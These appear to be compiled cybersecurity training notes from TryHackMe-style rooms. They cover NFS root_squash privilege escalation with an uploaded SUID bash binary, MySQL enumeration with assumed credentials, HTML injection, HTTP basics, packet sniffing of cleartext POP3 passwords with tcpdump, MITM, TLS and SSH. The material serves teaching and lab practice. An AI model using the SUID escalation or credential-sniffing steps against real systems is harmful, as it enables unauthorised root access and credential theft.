<p>Not quite, if you have a low privilege shell on any machine and you found that a machine has an NFS share you might be able to use that to escalate privileges, depending on how it is configured.</p>
<p>What is root_squash?</p>
<p>By default, on NFS shares- Root Squashing is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges. Not what we want. However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.</p>
<p>SUID
So, what are files with the SUID bit set? Essentially, this means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!</p>
<p>Method</p>
<p>This sounds complicated, but really- provided you're familiar with how SUID files work, it's fairly easy to understand. We're able to upload files to the NFS share, and control the permissions of these files. We can set the permissions of whatever we upload, in this case a bash shell executable. We can then log in through SSH, as we did in the previous task- and execute this executable to gain a root shell!</p>
<p>The Executable</p>
<p>Due to compatibility reasons, we'll use a standard Ubuntu Server 18.04 bash executable, the same as the server's- as we know from our nmap scan. You can download it here. If you want to download it via the command line, be careful not to download the github page instead of the raw script. You can use wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash.</p>
<p>Mapped Out Pathway:</p>
<p>If this is still hard to follow, here's a step by step of the actions we're taking, and how they all tie together to allow us to gain a root shell:</p>
<pre><code>NFS Access -&gt;

    Gain Low Privilege Shell -&gt;

        Upload Bash Executable to the NFS share -&gt;

            Set SUID Permissions Through NFS Due To Misconfigured Root Squash -&gt;

                Login through SSH -&gt;

                    Execute SUID Bit Bash Executable -&gt;

                        ROOT ACCESS

<div style="break-before: page; page-break-before: always;"></div><h1 id="basic-mysql"><a class="header" href="#basic-mysql">Basic MySQL</a></h1>
<p>What is MySQL?</p>
<p>In its simplest definition, MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL). Too many acronyms? Let's break it down:</p>
<p>Database:</p>
<p>A database is simply a persistent, organised collection of structured data</p>
<p>RDBMS:</p>
<p>A software or service used to create and manage databases based on a relational model. The word &quot;relational&quot; just means that the data stored in the dataset is organised as tables. Every table relates in some way to each other's &quot;primary key&quot; or other &quot;key&quot; factors.</p>
<p>SQL:</p>
<p>MYSQL is just a brand name for one of the most popular RDBMS software implementations. As we know, it uses a client-server model. But how do the client and server communicate? They use a language, specifically the Structured Query Language (SQL).</p>
<p>Many other products, such as PostgreSQL and Microsoft SQL server, have the word SQL in them. This similarly signifies that this is a product utilising the Structured Query Language syntax.</p>
<p>How does MySQL work?</p>
<p>MySQL, as an RDBMS, is made up of the server and utility programs that help in the administration of MySQL databases.</p>
<p>The server handles all database instructions like creating, editing, and accessing data. It takes and manages these requests and communicates using the MySQL protocol. This whole process can be broken down into these stages:</p>
<p>MySQL creates a database for storing and manipulating data, defining the relationship of each table.
Clients make requests by making specific statements in SQL.
The server will respond to the client with whatever information has been requested.
What runs MySQL?</p>
<p>MySQL can run on various platforms, whether it's Linux or windows. It is commonly used as a back end database for many prominent websites and forms an essential component of the LAMP stack, which includes: Linux, Apache, MySQL, and PHP.</p>
<p>More Information:</p>
<p>Here are some resources that explain the technical implementation, and working of, MySQL in more detail than I have covered here:</p>
<p>https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html </p>
<p>https://www.w3schools.com/php/php_mysql_intro.asp</p>
<p>Let's Get Started</p>
<p>Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, as this can take up to five minutes, so be patient!</p>
<p>When you would begin attacking MySQL</p>
<p>MySQL is likely not going to be the first point of call when getting initial information about the server. You can, as we have in previous tasks, attempt to brute-force default account passwords if you really don't have any other information; however, in most CTF scenarios, this is unlikely to be the avenue you're meant to pursue.</p>
<p>The Scenario</p>
<p>Typically, you will have gained some initial credentials from enumerating other services that you can then use to enumerate and exploit the MySQL service. As this room focuses on exploiting and enumerating the network service, for the sake of the scenario, we're going to assume that you found the credentials: &quot;root:password&quot; while enumerating subdomains of a web server. After trying the login against SSH unsuccessfully, you decide to try it against MySQL.</p>
<p>Requirements</p>
<p>You will want to have MySQL installed on your system to connect to the remote MySQL server. In case this isn't already installed, you can install it using sudo apt install default-mysql-client. Don't worry- this won't install the server package on your system- just the client.</p>
<p>Again, we're going to be using Metasploit for this; it's important that you have Metasploit installed, as it is by default on both Kali Linux and Parrot OS.</p>
<p>Alternatives</p>
<p>As with the previous task, it's worth noting that everything we will be doing using Metasploit can also be done either manually or with a set of non-Metasploit tools such as nmap's mysql-enum script: https://nmap.org/nsedoc/scripts/mysql-enum.html or https://www.exploit-db.com/exploits/23081. I recommend that after you complete this room, you go back and attempt it manually to make sure you understand the process that is being used to display the information you acquire.</p>
<p>Okay, enough talk. Let's get going!</p>
<p>What do we know?</p>
<p>Let's take a sanity check before moving on to try and exploit the database fully, and gain more sensitive information than just database names. We know:</p>
<ol>
<li>
<p>MySQL server credentials</p>
</li>
<li>
<p>The version of MySQL running</p>
</li>
<li>
<p>The number of Databases, and their names.</p>
</li>
</ol>
<p>Key Terminology</p>
<p>In order to understand the exploits we're going to use next- we need to understand a few key terms.</p>
<p>Schema:</p>
<p>In MySQL, physically, a schema is synonymous with a database. You can substitute the keyword &quot;SCHEMA&quot; instead of DATABASE in MySQL SQL syntax, for example using CREATE SCHEMA instead of CREATE DATABASE. It's important to understand this relationship because some other database products draw a distinction. For example, in the Oracle Database product, a schema represents only a part of a database: the tables and other objects owned by a single user.</p>
<p>Hashes:</p>
<p>Hashes are, very simply, the product of a cryptographic algorithm to turn a variable length input into a fixed length output.</p>
<p>In MySQL hashes can be used in different ways, for instance to index data into a hash table. Each hash has a unique ID that serves as a pointer to the original data. This creates an index that is significantly smaller than the original data, allowing the values to be searched and accessed more efficiently</p>
<p>However, the data we're going to be extracting are password hashes which are simply a way of storing passwords not in plaintext format.</p>
<p>Lets get cracking.</p>

<p>By the end of this room, you'll know how websites are created and will be introduced to some basic security issues.</p>
<p>When you visit a website, your browser (like Safari or Google Chrome) makes a request to a web server asking for information about the page you're visiting. It will respond with data that your browser uses to show you the page; a web server is just a dedicated computer somewhere else in the world that handles your requests.</p>
<p>There are two major components that make up a website:</p>
<p>Front End (Client-Side) - the way your browser renders a website.
Back End (Server-Side) - a server that processes your request and returns a response.
There are many other processes involved in your browser making a request to a web server, but for now, you just need to understand that you make a request to a server, and it responds with data your browser uses to render information to you.</p>
<p>Websites are primarily created using:</p>
<p>HTML, to build websites and define their structure
CSS, to make websites look pretty by adding styling options
JavaScript, implement complex features on pages using interactivity
HyperText Markup Language (HTML) is the language websites are written in. Elements (also known as tags) are the building blocks of HTML pages and tells the browser how to display content. The code snippet below shows a simple HTML document, the structure of which is the same for every website:</p>
<p>The HTML structure (as shown in the screenshot) has the following components:</p>
<p>The <!DOCTYPE html> defines that the page is a HTML5 document. This helps with standardisation across different browsers and tells the browser to use HTML5 to interpret the page.
The <html> element is the root element of the HTML page - all other elements come after this element.
The <head> element contains information about the page (such as the page title)
The <body> element defines the HTML document's body; only content inside of the body is shown in the browser.
The <h1> element defines a large heading
The <p> element defines a paragraph
There are many other elements (tags) used for different purposes. For example, there are tags for buttons (<button>), images (<img>), lists, and much more. 
Tags can contain attributes such as the class attribute which can be used to style an element (e.g. make the tag a different color) <p class="bold-text">, or the src attribute which is used on images to specify the location of an image: <img src="network/img/cat.jpg">.An element can have multiple attributes each with its own unique purpose, e.g., <p attribute1="value1" attribute2="value2">.</p>
<p>Elements can also have an id attribute (<p id="example">), which is unique to the element. Unlike the class attribute, where multiple elements can use the same class, an element must have different id's to identify them uniquely. Element id's are used for styling and to identify it by JavaScript.</p>
<p>You can view the HTML of any website by right-clicking and selecting &quot;View Page Source&quot; (Chrome) / &quot;Show Page Source&quot; (Safari).</p>
<p>JavaScript (JS) is one of the most popular coding languages in the world and allows pages to become interactive. HTML is used to create the website structure and content, while JavaScript is used to control the functionality of web pages - without JavaScript, a page would not have interactive elements and would always be static. JS can dynamically update the page in real-time, giving functionality to change the style of a button when a particular event on the page occurs (such as when a user clicks a button) or to display moving animations.</p>
<p>JavaScript is added within the page source code and can be either loaded within <script> tags or can be included remotely with the src attribute: <script src="/location/of/javascript_file.js"></script></p>
<p>The following JavaScript code finds a HTML element on the page with the id of &quot;demo&quot; and changes the element's contents to &quot;Hack the Planet&quot; : document.getElementById(&quot;demo&quot;).innerHTML = &quot;Hack the Planet&quot;;</p>
<p>HTML elements can also have events, such as &quot;onclick&quot; or &quot;onhover&quot; that execute JavaScript when the event occurs. The following code changes the text of the element with the demo ID to Button Clicked: <button onclick='document.getElementById("demo").innerHTML = "Button Clicked";'>Click Me!</button> - onclick events can also be defined inside the JavaScript script tags, and not on elements directly. </p>
<p>Sensitive Data Exposure occurs when a website doesn't properly protect (or remove) sensitive clear-text information to the end-user; usually found in a site's frontend source code.</p>
<p>We now know that websites are built using many HTML elements (tags), all of which we can see simply by &quot;viewing the page source&quot;. A website developer may have forgotten to remove login credentials, hidden links to private parts of the website or other sensitive data shown in HTML or JavaScript.</p>
<p>Sensitive information can be potentially leveraged to further an attacker's access within different parts of a web application. For example, there could be HTML comments with temporary login credentials, and if you viewed the page's source code and found this, you could use these credentials to log in elsewhere on the application (or worse, used to access other backend components of the site).</p>
<p>Whenever you're assessing a web application for security issues, one of the first things you should do is review the page source code to see if you can find any exposed login credentials or hidden links.</p>
<p>HTML Injection is a vulnerability that occurs when unfiltered user input is displayed on the page. If a website fails to sanitise user input (filter any &quot;malicious&quot; text that a user inputs into a website), and that input is used on the page, an attacker can inject HTML code into a vulnerable website.</p>
<p>Input sanitisation is very important in keeping a website secure, as information a user inputs into a website is often used in other frontend and backend functionality. A vulnerability you'll explore in another lab is database injection, where you can manipulate a database lookup query to log in as another user by controlling the input that's directly used in the query - but for now, let's focus on HTML injection (which is client-side).</p>
<p>When a user has control of how their input is displayed, they can submit HTML (or JavaScript) code, and the browser will use it on the page, allowing the user to control the page's appearance and functionality.</p>
<p>The image above shows how a form outputs text to the page. Whatever the user inputs into the &quot;What's your name&quot; field is passed to a JavaScript function and output to the page, which means if the user adds their own HTML or JavaScript in the field, it's used in the sayHi function and is added to the page - this means you can add your own HTML (such as a <h1> tag) and it will output your input as pure HTML.</p>
<p>The general rule is never to trust user input. To prevent malicious input, the website developer should sanitise everything the user enters before using it in the JavaScript function; in this case, the developer could remove any HTML tags.</p>
<p>What is HTTP? (HyperText Transfer Protocol)</p>
<p>HTTP is what's used whenever you view a website, developed by Tim Berners-Lee and his team between 1989-1991. HTTP is the set of rules used for communicating with web servers for the transmitting of webpage data, whether that is HTML, Images, Videos, etc.</p>
<p>What is HTTPS? (HyperText Transfer Protocol Secure)</p>
<p>HTTPS is the secure version of HTTP. HTTPS data is encrypted so it not only stops people from seeing the data you are receiving and sending, but it also gives you assurances that you're talking to the correct web server and not something impersonating it.</p>
<p>When we access a website, your browser will need to make requests to a web server for assets such as HTML, Images, and download the responses. Before that, you need to tell the browser specifically how and where to access these resources, this is where URLs will help.</p>
<p>What is a URL? (Uniform Resource Locator)</p>
<p>If you’ve used the internet, you’ve used a URL before. A URL is predominantly an instruction on how to access a resource on the internet. The below image shows what a URL looks like with all of its features (it does not use all features in every request).</p>
<p>A diagram showing different parts of a URL on an example, where http is the scheme, user:password is the user, tryhackme.com is a domain or the host, 80 is the port, view-room is the path, ?id=1 is the query string, and #task3 is the fragment. The full address is http://user:password@tryhackme.com:80/view-room?id=1#task3.</p>
<p>Scheme: This instructs on what protocol to use for accessing the resource such as HTTP, HTTPS, FTP (File Transfer Protocol).</p>
<p>User: Some services require authentication to log in, you can put a username and password into the URL to log in.</p>
<p>Host: The domain name or IP address of the server you wish to access.</p>
<p>Port: The Port that you are going to connect to, usually 80 for HTTP and 443 for HTTPS, but this can be hosted on any port between 1 - 65535.</p>
<p>Path: The file name or location of the resource you are trying to access.</p>
<p>Query String: Extra bits of information that can be sent to the requested path. For example, /blog?id=1 would tell the blog path that you wish to receive the blog article with the id of 1.</p>
<p>Fragment: This is a reference to a location on the actual page requested. This is commonly used for pages with long content and can have a certain part of the page directly linked to it, so it is viewable to the user as soon as they access the page.</p>
<p>Making a Request</p>
<p>It's possible to make a request to a web server with just one line &quot;GET / HTTP/1.1&quot;</p>
<p>But for a much richer web experience, you’ll need to send other data as well. This other data is sent in what is called headers, where headers contain extra information to give to the web server you’re communicating with, but we’ll go more into this in the Header task.</p>
<p>Example Request:</p>
<p>GET / HTTP/1.1
Host: tryhackme.com
User-Agent: Mozilla/5.0 Firefox/87.0
Referer: https://tryhackme.com/
To breakdown each line of this request:</p>
<p>Line 1: This request is sending the GET method ( more on this in the HTTP Methods task ), request the home page with / and telling the web server we are using HTTP protocol version 1.1.</p>
<p>Line 2: We tell the web server we want the website tryhackme.com</p>
<p>Line 3: We tell the web server we are using the Firefox version 87 Browser</p>
<p>Line 4: We are telling the web server that the web page that referred us to this one is https://tryhackme.com</p>
<p>Line 5: HTTP requests always end with a blank line to inform the web server that the request has finished.</p>
<p>Example Response:</p>
<p>HTTP/1.1 200 OK
Server: nginx/1.15.8
Date: Fri, 09 Apr 2021 13:34:03 GMT
Content-Type: text/html
Content-Length: 98</p>
<html>
<head>
    <title>TryHackMe</title>
</head>
<body>
    Welcome To TryHackMe.com
</body>
</html>
To breakdown each line of the response:
<p>Line 1: HTTP 1.1 is the version of the HTTP protocol the server is using and then followed by the HTTP Status Code in this case &quot;200 Ok&quot; which tells us the request has completed successfully.</p>
<p>Line 2: This tells us the web server software and version number.</p>
<p>Line 3: The current date, time and timezone of the web server.</p>
<p>Line 4: The Content-Type header tells the client what sort of information is going to be sent, such as HTML, images, videos, pdf, XML.</p>
<p>Line 5: Content-Length tells the client how long the response is, this way we can confirm no data is missing.</p>
<p>Line 6: HTTP response contains a blank line to confirm the end of the HTTP response.</p>
<p>Lines 7-14: The information that has been requested, in this instance the homepage.</p>
<p>HTTP methods are a way for the client to show their intended action when making an HTTP request. There are a lot of HTTP methods but we'll cover the most common ones, although mostly you'll deal with the GET and POST method.</p>
<p>GET Request</p>
<p>This is used for getting information from a web server.</p>
<p>POST Request</p>
<p>This is used for submitting data to the web server and potentially creating new records</p>
<p>PUT Request</p>
<p>This is used for submitting data to a web server to update information</p>
<p>DELETE Request</p>
<p>This is used for deleting information/records from a web server.</p>
<p>HTTP Status Codes:
In the previous task, you learnt that when a HTTP server responds, the first line always contains a status code informing the client of the outcome of their request and also potentially how to handle it. These status codes can be broken down into 5 different ranges:</p>
<p>100-199 - Information Response	These are sent to tell the client the first part of their request has been accepted and they should continue sending the rest of their request. These codes are no longer very common.
200-299 - Success	This range of status codes is used to tell the client their request was successful.
300-399 - Redirection	These are used to redirect the client's request to another resource. This can be either to a different webpage or a different website altogether.
400-499 - Client Errors	Used to inform the client that there was an error with their request.
500-599 - Server Errors	This is reserved for errors happening on the server-side and usually indicate quite a major problem with the server handling the request.
Common HTTP Status Codes:</p>
<p>There are a lot of different HTTP status codes and that's not including the fact that applications can even define their own, we'll go over the most common HTTP responses you are likely to come across:</p>
<p>200 - OK	The request was completed successfully.
201 - Created	A resource has been created (for example a new user or new blog post).
301 - Moved Permanently	This redirects the client's browser to a new webpage or tells search engines that the page has moved somewhere else and to look there instead.
302 - Found	Similar to the above permanent redirect, but as the name suggests, this is only a temporary change and it may change again in the near future.
400 - Bad Request	This tells the browser that something was either wrong or missing in their request. This could sometimes be used if the web server resource that is being requested expected a certain parameter that the client didn't send.
401 - Not Authorised	You are not currently allowed to view this resource until you have authorised with the web application, most commonly with a username and password.
403 - Forbidden	You do not have permission to view this resource whether you are logged in or not.
405 - Method Not Allowed	The resource does not allow this method request, for example, you send a GET request to the resource /create-account when it was expecting a POST request instead.
404 - Page Not Found	The page/resource you requested does not exist.
500 - Internal Service Error	The server has encountered some kind of error with your request that it doesn't know how to handle properly.
503 - Service Unavailable	
This server cannot handle your request as it's either overloaded or down for maintenance.</p>
<p>Click the &quot;View Site&quot; button on the right to see what some of these HTTP status messages look like in a browser.</p>
<p>Headers are additional bits of data you can send to the web server when making requests.</p>
<p>Although no headers are strictly required when making a HTTP request, you’ll find it difficult to view a website properly.</p>
<p>Common Request Headers</p>
<p>﻿These are headers that are sent from the client (usually your browser) to the server.</p>
<p>Host: Some web servers host multiple websites so by providing the host headers you can tell it which one you require, otherwise you'll just receive the default website for the server.</p>
<p>User-Agent: This is your browser software and version number, telling the web server your browser software helps it format the website properly for your browser and also some elements of HTML, JavaScript and CSS are only available in certain browsers.</p>
<p>Content-Length: When sending data to a web server such as in a form, the content length tells the web server how much data to expect in the web request. This way the server can ensure it isn't missing any data.</p>
<p>Accept-Encoding: Tells the web server what types of compression methods the browser supports so the data can be made smaller for transmitting over the internet.</p>
<p>Cookie: Data sent to the server to help remember your information (see cookies task for more information).
Common Response Headers</p>
<p>These are the headers that are returned to the client from the server after a request.</p>
<p>Set-Cookie: Information to store which gets sent back to the web server on each request (see cookies task for more information).</p>
<p>Cache-Control: How long to store the content of the response in the browser's cache before it requests it again.</p>
<p>Content-Type: This tells the client what type of data is being returned, i.e., HTML, CSS, JavaScript, Images, PDF, Video, etc. Using the content-type header the browser then knows how to process the data.</p>
<p>Content-Encoding: What method has been used to compress the data to make it smaller when sending it over the internet.</p>
<p>You've probably heard of cookies before, they're just a small piece of data that is stored on your computer. Cookies are saved when you receive a &quot;Set-Cookie&quot; header from a web server. Then every further request you make, you'll send the cookie data back to the web server. Because HTTP is stateless (doesn't keep track of your previous requests), cookies can be used to remind the web server who you are, some personal settings for the website or whether you've been to the website before. Let's take a look at this as an example HTTP request:</p>
<p>A diagram visualizing how cookies are introduced in http requests to allow storing user information</p>
<p>Cookies can be used for many purposes but are most commonly used for website authentication. The cookie value won't usually be a clear-text string where you can see the password, but a token (unique secret code that isn't easily humanly guessable).</p>
<p>Viewing Your Cookies</p>
<p>You can easily view what cookies your browser is sending to a website by using the developer tools, in your browser. If you're not sure how to get to the developer tools in your browser, click on the &quot;View Site&quot; button at the top of this task for a how-to guide.</p>
<p>Once you have developer tools open, click on the &quot;Network&quot; tab. This tab will show you a list of all the resources your browser has requested. You can click on each one to receive a detailed breakdown of the request and response. If your browser sent a cookie, you will see these on the &quot;Cookies&quot; tab of the request.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="basic-attack-types"><a class="header" href="#basic-attack-types">Basic attack types</a></h1>
<p>The Protocols and Servers room covered many protocols:</p>
<p>Telnet
HTTP
FTP
SMTP
POP3
IMAP
Servers implementing these protocols are subject to different kinds of attacks. To name a few, consider:</p>
<p>Sniffing Attack (Network Packet Capture)
Man-in-the-Middle (MITM) Attack
Password Attack (Authentication Attack)
Vulnerabilities
From a security perspective, we always need to think about what we aim to protect; consider the security triad: Confidentiality, Integrity, and Availability (CIA). Confidentiality refers to keeping the contents of the communications accessible to the intended parties. Integrity is the idea of assuring any data sent is accurate, consistent, and complete when reaching its destination. Finally, availability refers to being able to access the service when we need it. Different parties will put varying emphasis on these three. For instance, confidentiality would be the highest priority for an intelligence agency. Online banking will put most emphasis on the integrity of transactions. Availability is of the highest importance for any platform making money by serving ads.</p>
<p>Knowing that we are protecting the Confidentiality, Integrity, and Availability (CIA), an attack aims to cause Disclosure, Alteration, and Destruction (DAD). The figures below reflect this.</p>
<p>These attacks directly affect the security of the system. For instance, network packet capture violates confidentiality and leads to the disclosure of information. A successful password attack can also lead to disclosure. On the other hand, a Man-in-the-Middle (MITM) attack breaks the system’s integrity as it can alter the communicated data. We will focus on these three attacks in this room as these attacks are integral to the protocol design and server implementation.</p>
<p>Vulnerabilities are of a broader spectrum, and exploited vulnerabilities have different impacts on the target systems. For instance, exploiting a Denial of Service (DoS) vulnerability can affect the system’s availability, while exploiting a Remote Code Execution (RCE) vulnerability can lead to more severe damages. It is important to note that a vulnerability by itself creates a risk; damage can occur only when the vulnerability is exploited. We don’t cover vulnerabilities in this room as they have their own module, Vulnerability Research.</p>
<p>This room will focus on how a protocol can be upgraded or replaced to protect against disclosure and alteration, i.e. protecting the confidentiality and integrity of the transmitted data. We will be recommending other modules that cover additional topics.</p>
<p>Moreover, we introduce Hydra to find weak passwords.</p>
<p>Sniffing attack refers to using a network packet capture tool to collect information about the target. When a protocol communicates in cleartext, the data exchanged can be captured by a third party to analyse. A simple network packet capture can reveal information, such as the content of private messages and login credentials, if the data isn't encrypted in transit.</p>
<p>A sniffing attack can be conducted using an Ethernet (802.3) network card, provided that the user has proper permissions (root permissions on Linux and administrator privileges on MS Windows). There are many programs available to capture network packets. We consider the following:</p>
<p>Tcpdump is a free open source command-line interface (CLI) program that has been ported to work on many operating systems.
Wireshark is a free open source graphical user interface (GUI) program available for several operating systems, including Linux, macOS and MS Windows.
Tshark is a CLI alternative to Wireshark.
There are several specialized tools for capturing passwords and even complete messages; however, this can still be achieved by Tcpdump and Wireshark with some added effort.</p>
<p>Consider a user checking his email messages using POP3. First, we are going to use Tcpdump to attempt to capture the username and password. In the terminal output below, we used the command sudo tcpdump port 110 -A. Before explaining this command, we should mention that this attack requires access to the network traffic, for example, via a wiretap or a switch with port mirroring. Alternatively, we can access the traffic exchanged if we launch a successful Man-in-the-Middle (MITM) attack.</p>
<p>We need sudo as packet captures require root privileges. We wanted to limit the number of captured and displayed packets to those exchanged with the POP3 server. We know that POP3 uses port 110, so we filtered our packets using port 110. Finally, we wanted to display the contents of the captured packets in ASCII format, so we added -A.</p>
<p>Pentester Terminal

In the terminal output above, we have removed the unimportant packets to help you better focus on the ones that matter. In particular, the username and password were each sent in their own packet. The first packet explicitly displays “USER frank”, while the last packet reveals the password “PASS D2xc9CgD”.</p>
<p>We could also use Wireshark to achieve the same results. In the Wireshark window below, we can see that we have entered pop in the filter field. Now that we've filtered just the traffic we're interested in, we can see a username and password were captured.</p>
<p>In brief, any protocol that uses cleartext communication is susceptible to this kind of attack. The only requirement for this attack to succeed is to have access to a system between the two communicating systems. This attack requires attention; the mitigation lies in adding an encryption layer on top of any network protocol. In particular, Transport Layer Security (TLS) has been added to HTTP, FTP, SMTP, POP3, IMAP and many others. For remote access, Telnet has been replaced by the secure alternative Secure Shell (SSH).</p>
<p>A Man-in-the-Middle (MITM) attack occurs when a victim (A) believes they are communicating with a legitimate destination (B) but is unknowingly communicating with an attacker (E). In the figure below, we have A requesting the transfer of $20 to M; however, E altered this message and replaced the original value with a new one. B received the modified messaged and acted on it.</p>
<p>This attack is relatively simple to carry out if the two parties do not confirm the authenticity and integrity of each message. In some cases, the chosen protocol does not provide secure authentication or integrity checking; moreover, some protocols have inherent insecurities that make them susceptible to this kind of attack.</p>
<p>Any time you browse over HTTP, you are susceptible to a MITM attack, and the scary thing is that you cannot recognize it. Many tools would aid you in carrying out such an attack, such as Ettercap and Bettercap.</p>
<p>MITM can also affect other cleartext protocols such as FTP, SMTP, and POP3. Mitigation against this attack requires the use of cryptography. The solution lies in proper authentication along with encryption or signing of the exchanged messages. With the help of Public Key Infrastructure (PKI) and trusted root certificates, Transport Layer Security (TLS) protects from MITM attacks.</p>
<p>In this task, we learn about a standard solution to protect the confidentiality and integrity of the exchanged packets. The following approach can protect against password sniffing and MITM attacks.</p>
<p>SSL (Secure Sockets Layer) started when the world wide web started to see new applications, such as online shopping and sending payment information. Netscape introduced SSL in 1994, with SSL 3.0 being released in 1996. But eventually, more security was needed, and TLS (Transport Layer Security) protocol was introduced in 1999. Before we explain what TLS and SSL provide, let’s see how they fit the networking model.</p>
<p>The common protocols we have covered so far send the data in cleartext; this makes it possible for anyone with access to the network to capture, save and analyze the exchanged messages. The image below shows the ISO/OSI network layers. The protocols we have covered so far in this room are on the application layer. Consider the ISO/OSI model; we can add encryption to our protocols via the presentation layer. Consequently, data will be presented in an encrypted format (ciphertext) instead of its original form.</p>
<p>Because of the close relation between SSL and TLS, one might be used instead of the other. However, TLS is more secure than SSL, and it has practically replaced SSL. We could have dropped SSL and just written TLS instead of SSL/TLS, but we will continue to mention the two to avoid any ambiguity because the term SSL is still in wide use. However, we can expect all modern servers to be using TLS.</p>
<p>An existing cleartext protocol can be upgraded to use encryption via SSL/TLS. We can use TLS to upgrade HTTP, FTP, SMTP, POP3, and IMAP, to name a few. The following table lists the protocols we have covered and their default ports before and after the encryption upgrade via SSL/TLS. The list is not exhaustive; however, the purpose is to help us better understand the process.</p>
<p>Protocol	Default Port	Secured Protocol	Default Port with TLS
HTTP	80	HTTPS	443
FTP	21	FTPS	990
SMTP	25	SMTPS	465
POP3	110	POP3S	995
IMAP	143	IMAPS	993
Considering the case of HTTP. Initially, to retrieve a web page over HTTP, the web browser would need at least perform the following two steps:</p>
<p>Establish a TCP connection with the remote web server
Send HTTP requests to the web server, such as GET and POST requests.
HTTPS requires an additional step to encrypt the traffic. The new step takes place after establishing a TCP connection and before sending HTTP requests. This extra step can be inferred from the ISO/OSI model in the image presented earlier. Consequently, HTTPS requires at least the following three steps:</p>
<p>Establish a TCP connection
Establish SSL/TLS connection
Send HTTP requests to the webserver
To establish an SSL/TLS connection, the client needs to perform the proper handshake with the server. Based on RFC 6101, the SSL connection establishment will look like the figure below.</p>
<p>After establishing a TCP connection with the server, the client establishes an SSL/TLS connection, as shown in the figure above. The terms might look complicated depending on your knowledge of cryptography, but we can simplify the four steps as:</p>
<p>The client sends a ClientHello to the server to indicate its capabilities, such as supported algorithms.
The server responds with a ServerHello, indicating the selected connection parameters. The server provides its certificate if server authentication is required. The certificate is a digital file to identify itself; it is usually digitally signed by a third party. Moreover, it might send additional information necessary to generate the master key, in its ServerKeyExchange message, before sending the ServerHelloDone message to indicate that it is done with the negotiation.
The client responds with a ClientKeyExchange, which contains additional information required to generate the master key. Furthermore, it switches to use encryption and informs the server using the ChangeCipherSpec message.
The server switches to use encryption as well and informs the client in the ChangeCipherSpec message.
If this still sounds sophisticated, don’t worry; we only need the gist of it. A client was able to agree on a secret key with a server that has a public certificate. This secret key was securely generated so that a third party monitoring the channel wouldn’t be able to discover it. Further communication between the client and the server will be encrypted using the generated key.</p>
<p>Consequently, once an SSL/TLS handshake has been established, HTTP requests and exchanged data won’t be accessible to anyone watching the communication channel.</p>
<p>As a final note, for SSL/TLS to be effective, especially when browsing the web over HTTPS, we rely on public certificates signed by certificate authorities trusted by our systems. In other words, when we browse to TryHackMe over HTTPS, our browser expects the TryHackMe web server to provide a signed certificate from a trusted certificate authority, as per the example below. This way, our browser ensures that it is communicating with the correct server, and a MITM attack cannot occur.</p>
<p>In the figure above, we can see the following information:</p>
<p>To whom is the certificate issued? That is the name of the company that will use this certificate.
Who issued the certificate? This is the certificate authority that issued this certificate.
Validity period. You don’t want to use a certificate that has expired, for instance.
Luckily, we don’t have to check the certificate manually for every site we visit; our web browser will do it for us. Our web browser will ensure that we are talking with the correct server and ensure that our communication is secure, thanks to the server’s certificate.</p>
<p>Secure Shell (SSH) was created to provide a secure way for remote system administration. In other words, it lets you securely connect to another system over the network and execute commands on the remote system. Put simply, the “S” in SSH stands for secure, which can be summarized simply as:</p>
<p>You can confirm the identity of the remote server
Exchanged messages are encrypted and can only be decrypted by the intended recipient
Both sides can detect any modification in the messages
The above three points are ensured by cryptography. In more technical terms, they are part of confidentiality and integrity, made possible through the proper use of different encryption algorithms.</p>
<p>To use SSH, you need an SSH server and an SSH client. The SSH server listens on port 22 by default. The SSH client can authenticate using:</p>
<p>A username and a password
A private and public key (after the SSH server is configured to recognize the corresponding public key)
On Linux, macOS, and MS Windows builds after 2018, you can connect to an SSH server using the following command ssh username@10.10.183.166. This command will try to connect to the server of IP address 10.10.183.166 with the login name username. If an SSH server is listening on the default port, it will ask you to provide the password for username. Once authenticated, the user will have access to the target server’s terminal. The terminal output below is an example of using SSH to access a Debian Linux server.</p>
<p>Terminal
user@TryHackMe$ ssh mark@10.10.183.166
mark@10.10.183.166's password: XBtc49AB</p>
<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>
<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Sep 20 13:53:17 2021
mark@debian8:~$ 
In the example above, we issued the command ssh mark@10.10.183.166. Then, once we entered the correct password, we got access to the remote system’s terminal. SSH is very reliable for remote administration because our username and password were sent encrypted; moreover, all commands we execute on the remote system will be sent over an encrypted channel.</p>
<p>Note that if this is the first time we connect to this system, we will need to confirm the fingerprint of the SSH server’s public key to avoid man-in-the-middle (MITM) attacks. As explained earlier, MITM takes place when a malicious party, E, situates itself between A and B, and communicates with A, pretending to be B, and communicates with B pretending to be A, while A and B think that they are communicating directly with each other. In the case of SSH, we don’t usually have a third party to check if the public key is valid, so we need to do this manually. This attack is shown in the image below.</p>
<p>We can use SSH to transfer files using SCP (Secure Copy Protocol) based on the SSH protocol. An example of the syntax is as follows: scp mark@10.10.183.166:/home/mark/archive.tar.gz ~. This command will copy a file named archive.tar.gz from the remote system located in the /home/mark directory to ~, i.e., the root of the home directory of the currently logged-in user.</p>
<p>Another example syntax is scp backup.tar.bz2 mark@10.10.183.166:/home/mark/. This command will copy the file backup.tar.bz2 from the local system to the directory /home/mark/ on the remote system.</p>
<p>Terminal
user@TryHackMe$ scp document.txt mark@10.10.183.166:/home/mark
mark@10.10.183.166's password: 
document.txt                                        100% 1997KB  70.4MB/s   00:00
As a closing note, FTP could be secured using SSL/TLS by using the FTPS protocol which uses port 990. It is worth mentioning that FTP can also be secured using the SSH protocol which is the SFTP protocol. By default this service listens on port 22, just like SSH.</p>
<p>We discussed network packet captures and MITM attacks as well as how these attacks can be mitigated using TLS and SSH. The third type of attack that we will cover in this room is a password attack.</p>
